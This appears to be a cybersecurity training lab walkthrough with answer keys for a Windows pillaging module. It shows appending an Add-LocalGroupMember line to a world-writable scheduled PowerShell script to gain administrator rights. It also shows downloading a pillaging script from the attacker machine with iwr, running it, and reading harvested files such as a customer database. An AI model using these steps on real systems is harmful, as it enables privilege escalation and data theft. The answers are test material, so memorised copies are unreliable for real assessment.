Students will use `icacls` to check the permissions on the `backupprep.ps1` script to find that all users have full access, meaning users on the system can make modifications to it and, subsequently, perform code injection:

Code: powershell

```powershell
icacls C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
```

```
PS C:\Users\john> icacls C:\ProgramData\CorpBackup\Scripts\backupprep.ps1

C:\ProgramData\CorpBackup\Scripts\backupprep.ps1 Everyone:(I)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                 BUILTIN\Administrators:(I)(F)
                                                 BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Answer: `code injection`

# Windows Pillaging

## Question 1

### "What is the customer ID of "Nicholas Taylor"?"

After spawning the target, students will open a terminal and establish an RDP session using `xfreerdp` and the `john:SuperSecurePass123` credentials:

Code: shell

```shell
xfreerdp /v:STMIP /u:john /p:SuperSecurePass123 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-qrpmrg31te]─[~]
└──╼ [★]$ xfreerdp /v:10.129.11.72 /u:john /p:SuperSecurePass123 /dynamic-resolution

[05:58:26:465] [11523:11524] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:58:26:465] [11523:11524] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:58:26:465] [11523:11524] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:58:26:545] [11523:11524] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:58:26:546] [11523:11524] [WARN][com.freerdp.crypto] - CN = WIN01
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.11.72:3389) 
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:58:26:547] [11523:11524] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:58:26:548] [11523:11524] [ERROR][com.freerdp.crypto] - 	WIN01
[05:58:26:548] [11523:11524] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.11.72:3389 (RDP-Server):
	Common Name: WIN01
	Subject:     CN = WIN01
	Issuer:      CN = WIN01
	Thumbprint:  ee:cc:0b:a1:94:aa:e5:b5:cf:86:62:bf:c8:e8:05:bc:af:62:8a:cd:4b:51:1b:03:17:2b:46:54:56:8b:01:2c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and will append a command to the `backupprep.ps1` PowerShell script located in the `C:\ProgramData\CorpBackup\Scripts` directory adding the user `john` to the local administrators' group (`Add-LocalGroupMember -Group 'Administrators' -Member 'WIN01\\john'`) at the end of the script based on the information they have gained from the previous section of having full access to the file and being executed every two minutes:

Code: powershell

```powershell
notepad C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\john> notepad C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
```

Students will wait two minutes and will sign out and reestablish the RDP session:

![[HTB Solutions/Others/z. images/e2ec7099b909e30d9026692786f7997f_MD5.jpg]]

Next, students will open a PowerShell terminal and confirm the addition to the local administrators group:

Code: powershell

```powershell
net user john
```

```
PS C:\Users\john> net user john

User name                    john
Full Name                    john
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2025 11:57:29 AM
Password expires             Never
Password changeable          2/23/2025 11:57:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/21/2025 6:07:34 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Event Log Readers
                             *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.
```

Students will return to their workstations, open a new terminal tab, and download the `pentest-in-a-nutshell.zip` archive from the `Resources` of the module, unzip it, and start a Python3 HTTP Server:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip; unzip pentest-in-a-nutshell.zip; dos2unix linpill.sh; python3 -m http.server
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-qrpmrg31te]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip; unzip pentest-in-a-nutshell.zip; dos2unix linpill.sh; python3 -m http.server

--2025-03-21 06:15:08--  https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.69, 109.176.239.70
Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70349 (69K) [application/zip]
Saving to: ‘pentest-in-a-nutshell.zip’

pentest-in-a-nutshe 100%[===================>]  68.70K  --.-KB/s    in 0.001s  

2025-03-21 06:15:08 (90.0 MB/s) - ‘pentest-in-a-nutshell.zip’ saved [70349/70349]

Archive:  pentest-in-a-nutshell.zip
  inflating: Assigned_PT_DRAFT.docx  
  inflating: linpill.sh              
  inflating: winpill.ps1             
dos2unix: converting file linpill.sh to Unix format...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Students will open PowerShell as Administrator, and download the `winpill.ps1` PowerShell script using `iwr` (Invoke-WebRequest) and saving the file to their current working directory:

Code: powershell

```powershell
cd ~
iwr -uri http://PWNIP:8000/winpill.ps1 -o winpill.ps1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd ~
PS C:\Users\john> iwr -uri http://10.10.14.73:8000/winpill.ps1 -o winpill.ps1
```

Next, students will execute the PowerShell script to perform Windows pillaging:

Code: powershell

```powershell
.\winpill.ps1
```

```
PS C:\Users\john> .\winpill.ps1

Extended Pillaging Script for Penetration Testing
This script is intended for authorized penetration testing only.
Ensure you have explicit permission to run this on the target system.
Unauthorized use may violate laws and regulations.

Data will be exported to: C:\Pillaging_2025-03-21_06-18-28
Started at: 2025-03-21_06-18-28

Collecting System Information...
=== System Information ===

Caption                                Version    BuildNumber OSArchitecture LastBootUpTime
-------                                -------    ----------- -------------- --------------
Microsoft Windows Server 2019 Standard 10.0.17763 17763       64-bit         3/21/2025 5:53:14 AM

<SNIP>
```

Students will query the `InterestingFiles.csv` file for any files related to `.csv` in the `C:\Pillaging_` directory, finding a single file `cusomter_database.csv`:

Code: powershell

```powershell
type C:\Pillaging_<DATE>\InterestingFiles.csv | findstr /i csv
```

```
PS C:\Users\john> type C:\Pillaging_2025-03-21_07-50-27\InterestingFiles.csv | findstr /i csv

"C:\Users\Administrator\customer_database.csv","45729","2/25/2025 6:21:33 AM"
```

Finally, students will query the contents of the `customer_database.csv` file and look for entries related to `Nicholas Taylor` to find his ID:

Code: powershell

```powershell
type "C:\Users\Administrator\customer_database.csv" | findstr /i "Nicholas Taylor"
```

```
PS C:\Users\john> type "C:\Users\Administrator\customer_database.csv" | findstr /i "Nicholas Taylor"

<SNIP>

{hidden},Nicholas,Taylor,amandalewis@yahoo.com,(157)922-3156,"8849 Brandon Roads Apt. 930
```

Answer: `7d660ce6-fb54-4006-8446-5ae1b3ae1064`

# Windows Pillaging

## Question 2

### "What is the path of the ADMIN$ share?"

Students will query the `Shares.csv` file created by the `winpill.ps1` PowerShell script to obtain the path of the `ADMIN$` share:

Code: powershell

```powershell
type C:\Pillaging_<DATE>\Shares.csv
```

```
PS C:\Users\john> type C:\Pillaging_2025-03-21_07-50-27\Shares.csv

"Name","Path","Description"
"ADMIN$","{hidden}","Remote Admin"
"C$","C:\","Default share"
"Devs","C:\Devs",""
"IPC$","","Remote IPC"
```

Answer: `C:\Windows`

# Windows Pillaging

## Question 3

### "Which Wireshark version is installed on the Windows target? (Format: x.y.z)"

Students will query the `Software32.csv` file created by the `winpill.ps1` PowerShell script to obtain the version of Wireshark installed on the system:

Code: powershell

```powershell
type C:\Pillaging_<DATE>\Software32.csv | findstr /i Wireshark
```

```
PS C:\Users\john> type C:\Pillaging_2025-03-21_07-50-27\Software32.csv | findstr /i Wireshark

"Wireshark {hidden} x64","{hidden}","The Wireshark developer community, https://www.wireshark.org",,"C:\Program Files\Wireshark"
```

Answer: `4.2.5`

# Windows Pillaging

## Question 4

### "How many firewall rules are enabled?"

Students will rerun the `winpill.ps1` PowerShell script or reuse the information obtained earlier to attain the number of enabled firewall rules:

```powershell
.\winpill.ps1
```
```
PS C:\Users\john> .\winpill.ps1

<SNIP>

Full list of 7415 files exported to C:\Pillaging_2025-03-21_08-06-44\InterestingFiles.csv
=== Summary of Key Findings ===
Enabled Firewall Rules: {hidden}
Non-Microsoft Scheduled Tasks: 8
Processes Running as SYSTEM: 0
Writable PATH Directories: 0
Sensitive Files Found: 121
Interesting Files Found: 7415
Saved Credentials Found: Yes
AlwaysInstallElevated Enabled: No
Pillaging complete. All data saved to C:\Pillaging_2025-03-21_08-06-44
Completed at: 2025-03-21_08-11-21
```

Answer: `198`